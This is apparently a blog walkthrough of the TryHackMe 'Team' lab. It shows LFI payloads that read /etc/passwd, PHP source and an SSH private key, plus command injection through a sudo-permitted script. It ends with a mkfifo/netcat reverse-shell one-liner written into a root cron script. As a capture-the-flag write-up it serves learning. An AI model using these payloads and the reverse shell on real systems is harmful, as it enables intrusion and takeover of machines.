---
layout: post
title: TryHackMe Walkthrough - Team
date: 2021-03-19
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Easy
permalink: /2021/03/TryHackMe-Walkthrough-Team/
img: 2021/03/Team.png
---

This is my walkthrough of the [Team room on TryHackMe](https://tryhackme.com/room/teamcw). It took me some time to get on the server, but once I got my first shell, the rest was easy.

* Room: Team
* Difficulty: Easy
* URL: https://tryhackme.com/room/teamcw

## Scanning
I begin any room by adding their IP to my `/etc/hosts` files and scanning it for opened ports. 

```bash
nmap -A -oN nmap.txt target
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
```

We have 3 ports open: FTP, SSH, and HTTP. I tried to connect anonymously on the FTP server, but it's not allowed. 


## Web Site
I went to look at the web site on port 80. It looks like the default Apache page. But when I looked closer, there is a message in the page tittle. 

![Page Title](/assets/images/2021/03/ApacheDefaultTitle.png "Page Title")

I did what it said, I added an entry for `team.thm` in my hosts files and navigated to that domain. 
```bash
10.10.189.59            team.thm
```

![Team Site](/assets/images/2021/03/TeamSite.png "Team Site")

This domain also contains a `robots.txt` file. It contains only one world 'dale'. I tried to go to http://team.thm/dale but it does not exists.

The site is pretty bare. I didn't see anything interested in the source code or in the included JavaScript files.

So I started enumerating the site

```bash
gobuster dir -e -u http://team.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/03/16 20:27:17 Starting gobuster in directory enumeration mode
===============================================================

http://team.thm/.htpasswd            (Status: 403) [Size: 273]
http://team.thm/.hta                 (Status: 403) [Size: 273]
http://team.thm/.htaccess            (Status: 403) [Size: 273]
http://team.thm/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
http://team.thm/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
http://team.thm/index.html           (Status: 200) [Size: 2966]
http://team.thm/robots.txt           (Status: 200) [Size: 5]
http://team.thm/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
http://team.thm/server-status        (Status: 403) [Size: 273]                               
===============================================================
2021/03/16 20:27:56 Finished
===============================================================
```

The basic GoBuster enumeration found some folders. So I ran GoBuster on them also. 

Nothing came out of `/assets/` and `/images/`. But `/scripts/` had a file called `script.txt`

I opened http://team.thm/scripts/script.txt to find this content:

```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

This hint that there is a version of the same file with another extension on the server. I used wfuzz to find it. 

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/extensions-skipfish.fuzz.txt --hw 31 -t10 "http://team.thm/scripts/script.FUZZ"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/scripts/script.FUZZ
Total requests: 93

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000053:   200        18 L     44 W       466 Ch      "old"
000000086:   200        21 L     71 W       597 Ch      "txt"

Total time: 0
Processed Requests: 93
Filtered Requests: 91
Requests/sec.: 0
```

I loaded http://team.thm/scripts/script.old in my browser and got the file with the password in. 

```bash
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " ThePassword
...
mget -R *
quit

```

## FTP Server
We now have the credentials to connect to the FTP server. Let's see what's in it.

```bash
ftp target
Connected to target.
220 (vsFTPd 3.0.3)
Name (target:ehogue): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 65534    65534        4096 Jan 15 20:25 .
drwxr-xr-x    5 65534    65534        4096 Jan 15 20:25 ..
-rw-r--r--    1 1002     1002          220 Apr 04  2018 .bash_logout
-rw-r--r--    1 1002     1002         3771 Apr 04  2018 .bashrc
drwxrwxr-x    3 1002     1002         4096 Jan 15 20:22 .local
-rw-r--r--    1 1002     1002          807 Apr 04  2018 .profile
drwx------    2 1002     1002         4096 Jan 15 20:24 .ssh
drwxrwxr-x    2 65534    65534        4096 Jan 15 20:25 workshare
226 Directory send OK.

ftp> cd .ssh
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1002     1002         4096 Jan 15 20:24 .
drwxr-xr-x    5 65534    65534        4096 Jan 15 20:25 ..
-rw-r--r--    1 1002     1002          222 Jan 15 20:24 known_hosts
226 Directory send OK.
```

This looks like someone home directory. There is a .ssh/ folder, but it's not writable, and it does not contains a private key.

Let's see what's in the workshare folder.

```bash
ftp> cd workshare
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15 20:25 .
drwxr-xr-x    5 65534    65534        4096 Jan 15 20:25 ..
-rwxr-xr-x    1 1002     1002          269 Jan 15 20:24 New_site.txt
226 Directory send OK.

ftp> get New_site.txt
local: New_site.txt remote: New_site.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
226 Transfer complete.
269 bytes received in 0.00 secs (280.3579 kB/s)

ftp> quit
221 Goodbye.

cat New_site.txt 
```

```
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```

## Dev Site

It looks like there is a development site. I modified by /etc/hosts file to add a line for the new subdomain.

```bash
10.10.189.59            dev.team.thm
```

I then navigated to the [dev site](http://dev.team.thm/) and got served a simple page. 

![Dev Site](/assets/images/2021/03/DevSite.png "Dev Site")

The dev site as a link to a PHP script: http://dev.team.thm/script.php?page=teamshare.php 

The page parameter look like it could be used for [LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/).   I tried reading the [passwd file](http://dev.team.thm/script.php?page=/etc/passwd) and it worked. 

![/etc/passwd](/assets/images/2021/03/passwdFile.png "/etc/passwd")

I then looked at the code of the `script.php` file to see if there was anything interesting in it. Since the PHP code gets executed, to view it we need to use the PHP filters to get the content as base64:   http://dev.team.thm/script.php?page=php://filter/convert.base64-encode/resource=script.php

This gave me a base64 string that I could decode to view the code. 

```php
echo -n "base64 string" | base64 -d

<?php   
$file = $_GET['page'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("teamshare.php");
   }
?>
```

Nothing new here, we just see that there is no filtering. We can load any file and it will be executed as PHP code. I then decided to try loading the Apache logs to see if I could poison them with some commands to run. But it did not work. 

Knowing I could load any file that the web server could read, I used that to read the user flag in dale's home folder: http://dev.team.thm/script.php?page=/home/dale/user.txt

Going back to the message in the file found on the FPT server, it mention that dale's private key must be in a configuration file somewhere on the server. 

```
Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.
```

I used wfuzz to try to find `.conf` file in the web root folder, dale's home folder and in `/etc/`.

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 0 -t10 "http://dev.team.thm/script.php?page=FUZZ.conf"
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 0 -t10 "http://dev.team.thm/script.php?page=/home/dale/FUZZ.conf"
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 0 -t10 "http://dev.team.thm/script.php?page=/etc/FUZZ.conf"
```

This did not bring anything of notice. I spent a lot of time here going over files, trying to enumerate folders for file in .conf. It took me way too long to think about the sshd configuration file. 
view-source:http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

```
#Dale id\_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
```

I took the key, removed the # from all the lines and saved it to a file. Then I changed the permissions and used it to connect to the server as Dale.

```bash
chmod 600 daleIdRsa 

ssh dale@target -i daleIdRsa 
Last login: Thu Mar 18 11:45:02 2021 from 10.13.3.36

dale@TEAM:~$ ls -l
total 4
-rw-rw-r-- 1 dale dale 17 Jan 15 21:30 user.txt
```

I was connected on the server. The user flag is there, but I already got it through the LFI vulnerability.

## Escalate to gyles
The first thing I always do when I get a shell, is to check if the user can run sudo. 

```bash
sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

Here, dale is allowed to run an `admin_checks` command as gyles without needing to provide a password. 

```bash
dale@TEAM:~$ ls -l /home/gyles/admin_checks
-rwxr--r-- 1 gyles editors 399 Jan 15 21:52 /home/gyles/admin_checks

dale@TEAM:~$ file /home/gyles/admin_checks
/home/gyles/admin_checks: Bourne-Again shell script, ASCII text executable

dale@TEAM:~$ cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

We cannot modified the code, so we will need to find a way to exploit the existing code. 

I've tried to create a sleep file in `/tmp` and get script to execute it. But I was not allowed to modify PATH when running sudo. 

Looking at code again, it request for the timestamp of the backup file. Whatever you pass there will be executed. So we can launch bash as gyle.

```bash 
sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: a
Enter 'date' to timestamp the file: /bin/bash -p
The Date is 

whoami
gyles
```

## Escalate to root

I copied dale's authorized_keys into gyles' .ssh folder and reconnected by ssh to have a better shell. 

I tried `sudo -l` again, but it requried a password. I looked into gyles' home folder. There were no interesting files. But I saw that the admin_checks script used to get here belongs to the group editors. 

I checked the groups for gyles

```bash
groups
gyles editors admin
```

They are part of the editors and admin groups. I looked around to see if any interesting files belongs to those groups.

```bash
gyles@TEAM:~$ find / -group editors 2>/dev/null 
/var/stats/stats.txt
/home/gyles/admin_checks
```

Nothing of value that belongs to the editors group.

```bash
find / -group admin 2>/dev/null 
/usr/local/bin
/usr/local/bin/main_backup.sh
/opt/admin_stuff
```

The admin group files and folders looks like they can 

```bash
gyles@TEAM:~$ ls -la /opt/admin_stuff/
total 12
drwxrwx--- 2 root admin 4096 Jan 17 20:38 .
drwxr-xr-x 3 root root  4096 Jan 16 20:24 ..
-rwxr--r-- 1 root root   200 Jan 17 20:38 script.sh

gyles@TEAM:~$ cat /opt/admin_stuff/script.sh 
#!/bin/bash
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

The file `/opt/admin_stuff/script.sh` is executed every minutes. Hopefully by a cronjob that belongs to root. I can't modify that file, but it execute the file `/usr/local/bin/main_backup.sh` which is one of the file that belongs to the group admin.

```bash 
gyles@TEAM:~$ ls -la /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh
gyles@TEAM:~$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
gyles@TEAM:~$ 
```

This file is writable by the admin group. So we can use it to launch a remote shell.

```bash
echo "mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" > /usr/local/bin/main_backup.sh
```

Once connected as root, I could get the root flag. 

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.230 46758
whoami
root
cat /root/root.txt
THE_FLAG
```